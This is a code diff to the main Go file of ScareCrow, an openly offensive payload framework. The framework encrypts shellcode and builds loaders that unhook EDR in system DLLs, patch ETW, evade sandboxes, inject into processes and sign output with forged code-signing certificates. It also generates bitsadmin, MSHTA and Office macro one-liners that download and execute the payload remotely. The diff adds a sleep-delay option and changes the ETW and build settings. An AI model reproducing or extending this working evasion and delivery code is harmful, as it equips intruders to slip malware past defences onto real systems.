@@ -3,6 +3,7 @@ package main
 import (
 	"ScareCrow/Cryptor"
 	"ScareCrow/Loader"
+	"ScareCrow/Utils"
 	"ScareCrow/limelighter"
 	"bytes"
 	"crypto/aes"
@@ -31,6 +32,7 @@ type FlagOptions struct {
 	console          bool
 	refresher        bool
 	sandbox          bool
+	sleep            bool
 }
 
 func options() *FlagOptions {
@@ -38,28 +40,28 @@ func options() *FlagOptions {
 	inputFile := flag.String("I", "", "Path to the raw 64-bit shellcode.")
 	console := flag.Bool("console", false, "Only for Binary Payloads - Generates verbose console information when the payload is executed. This will disable the hidden window feature.")
 	LoaderType := flag.String("Loader", "binary", `Sets the type of process that will sideload the malicious payload:
-[*] binary - Generates a binary based payload. (This type does not benfit from any sideloading)	
+[*] binary - Generates a binary based payload. (This type does not benefit from any sideloading)	
 [*] control - Loads a hidden control applet - the process name would be rundll32 if -O is specified a JScript loader will be generated.
-[*] dll - Generates just a DLL file. Can executed with commands such as rundll32 or regsvr32 with DllRegisterServer, DllGetClassObject as export functions.
+[*] dll - Generates just a DLL file. Can be executed with commands such as rundll32 or regsvr32 with DllRegisterServer, DllGetClassObject as export functions.
 [*] excel - Loads into a hidden Excel process using a JScript loader.
 [*] msiexec - Loads into MSIexec process using a JScript loader.
-[*] wscript - Loads into WScript process using a JScript loader.
-`)
+[*] wscript - Loads into WScript process using a JScript loader.`)
 	refresher := flag.Bool("unmodified", false, "When enabled will generate a DLL loader that WILL NOT removing the EDR hooks in system DLLs and only use custom syscalls (set to false by default)")
 	URL := flag.String("url", "", "URL associated with the Delivery option to retrieve the payload. (e.g. https://acme.com/)")
 	CommandLoader := flag.String("delivery", "", `Generates a one-liner command to download and execute the payload remotely:
-[*] bits - Generates a Bitsadmin one liner command to download, execute and remove the loader (Compatible with Binary, Control, Excel and Wscript Loaders).
-[*] hta - Generates a blank hta file containing the loader along with a MSHTA command execute the loader remotely in the background (Compatible with Control and Excel Loaders). 
-[*] macro - Generates an office macro that will download and execute the loader remotely (Compatible with Control, Excel and Wscript Loaders)`)
+[*] bits - Generates a Bitsadmin one liner command to download, execute and remove the loader (Compatible with Binary, Control, Excel, and Wscript Loaders).
+[*] hta - Generates a blank hta file containing the loader along with an MSHTA command to execute the loader remotely in the background (Compatible with Control and Excel Loaders). 
+[*] macro - Generates an office macro that will download and execute the loader remotely (Compatible with Control, Excel, and Wscript Loaders)`)
 	domain := flag.String("domain", "", "The domain name to use for creating a fake code signing cert. (e.g. www.acme.com) ")
 	password := flag.String("password", "", "The password for code signing cert. Required when -valid is used.")
-	ETW := flag.Bool("etw", false, "Enables ETW patching to prevent ETW events from being generated")
+	ETW := flag.Bool("noetw", false, "Disables the ETW patching that prevents ETW events from being generated.")
 	ProcessInjection := flag.String("injection", "", "Enables Process Injection Mode and specify the path to the process to create/inject into (use \\ for the path).")
-	configfile := flag.String("configfile", "", "The path to a json based configuration file to generate custom file attributes. This will not use the the default ones.")
+	configfile := flag.String("configfile", "", "The path to a json based configuration file to generate custom file attributes. This will not use the default ones.")
 	valid := flag.String("valid", "", "The path to a valid code signing cert. Used instead -domain if a valid code signing cert is desired.")
 	sandbox := flag.Bool("sandbox", false, `Enables sandbox evasion using IsDomainedJoined calls.`)
+	sleep := flag.Bool("nosleep", false, `Disables the sleep delay before the loader unhooks and executes the shellcode.`)
 	flag.Parse()
-	return &FlagOptions{outFile: *outFile, inputFile: *inputFile, URL: *URL, LoaderType: *LoaderType, CommandLoader: *CommandLoader, domain: *domain, password: *password, configfile: *configfile, console: *console, ETW: *ETW, ProcessInjection: *ProcessInjection, refresher: *refresher, valid: *valid, sandbox: *sandbox}
+	return &FlagOptions{outFile: *outFile, inputFile: *inputFile, URL: *URL, LoaderType: *LoaderType, CommandLoader: *CommandLoader, domain: *domain, password: *password, configfile: *configfile, console: *console, ETW: *ETW, ProcessInjection: *ProcessInjection, refresher: *refresher, valid: *valid, sandbox: *sandbox, sleep: *sleep}
 }
 
 func execute(opt *FlagOptions, name string) string {
@@ -78,9 +80,9 @@ func execute(opt *FlagOptions, name string) string {
 		name = limelighter.FileProperties(name, opt.configfile)
 	}
 	if opt.LoaderType == "binary" {
-		cmd = exec.Command(bin, "GOROOT_FINAL=/dev/null", "GOOS=windows", "GOARCH=amd64", "go", "build", "-a", "-trimpath", "-ldflags", "-s -w", "-o", ""+name+".exe")
+		cmd = exec.Command(bin, "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=1", "CC=x86_64-w64-mingw32-gcc", "CXX=x86_64-w64-mingw32-g++", "go", "build", "-a", "-trimpath", "-ldflags", "-w -s -buildid=", "-o", ""+name+".exe")
 	} else {
-		cmd = exec.Command(bin, "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=1", "CC=x86_64-w64-mingw32-gcc", "CXX=x86_64-w64-mingw32-g++", "go", "build", "-a", "-trimpath", "-ldflags", "-w -s", "-o", ""+name+".dll", "-buildmode=c-shared")
+		cmd = exec.Command(bin, "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=1", "CC=x86_64-w64-mingw32-gcc", "CXX=x86_64-w64-mingw32-g++", "go", "build", "-a", "-trimpath", "-ldflags", "-w -s -buildid=", "-o", ""+name+".dll", "-buildmode=c-shared")
 	}
 	fmt.Println("[*] Compiling Payload")
 	var out bytes.Buffer
@@ -96,6 +98,7 @@ func execute(opt *FlagOptions, name string) string {
 	} else {
 		compiledname = name + ".dll"
 	}
+
 	fmt.Println("[+] Payload Compiled")
 	limelighter.Signer(opt.domain, opt.password, opt.valid, compiledname)
 	return name
@@ -113,6 +116,7 @@ func main() {
 	“Fear, you must understand is more than a mere obstacle. 
 	Fear is a TEACHER. the first one you ever had.”
 	`)
+	Utils.Version()
 	opt := options()
 
 	if opt.inputFile == "" {
@@ -151,8 +155,12 @@ func main() {
 		log.Fatal("Error: Console mode is only for binary based payloads")
 	}
 
-	if opt.domain == "" {
+	if opt.domain == "" && opt.password == "" && opt.valid == "" {
 		log.Fatal("Error: Please provide a domain in order to generate a code signing certificate")
+	}
+
+	if opt.domain != "" && opt.password != "" && opt.valid != "" {
+		log.Fatal("Error: Please choose either -domain or -valid with -password to generate a code signing certificate")
 	}
 
 	if opt.password == "" && opt.valid != "" {
@@ -160,7 +168,7 @@ func main() {
 	}
 
 	if opt.ProcessInjection != "" && opt.ETW == true {
-		log.Fatal("Error: Currently process injection and ETW bypass is not available together yet. Please try only one of these options")
+		fmt.Println("[!] Currently ETW patching only affects the parent process not the injected process")
 	}
 
 	var rawbyte []byte
@@ -188,7 +196,7 @@ func main() {
 	b64key := base64.StdEncoding.EncodeToString(key)
 	b64iv := base64.StdEncoding.EncodeToString(iv)
 	fmt.Println("[+] Shellcode Encrypted")
-	name, filename := Loader.CompileFile(b64ciphertext, b64key, b64iv, opt.LoaderType, opt.outFile, opt.refresher, opt.console, opt.sandbox, opt.ETW, opt.ProcessInjection)
+	name, filename := Loader.CompileFile(b64ciphertext, b64key, b64iv, opt.LoaderType, opt.outFile, opt.refresher, opt.console, opt.sandbox, opt.ETW, opt.ProcessInjection, opt.sleep)
 	name = execute(opt, name)
 	Loader.CompileLoader(opt.LoaderType, opt.outFile, filename, name, opt.CommandLoader, opt.URL, opt.sandbox)
 
